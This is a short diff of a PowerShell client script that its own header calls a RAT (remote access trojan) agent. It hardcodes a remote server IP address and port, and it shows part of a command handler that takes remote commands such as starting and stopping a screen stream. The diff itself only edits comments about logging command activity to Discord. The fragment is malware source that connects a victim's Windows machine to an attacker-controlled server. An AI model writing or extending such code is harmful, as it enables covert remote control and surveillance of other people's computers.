@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: NOTTI GANG RAT (Apenas Logs Online, sem logs de comandos)
+# Agent Completo: NOTTI GANG RAT (APENAS LOG DE CONEXÃO)
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -675,7 +675,7 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                // O log de comandos do Discord foi removido daqui.
+                // NENHUM LOG DO DISCORD AQUI!
 
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
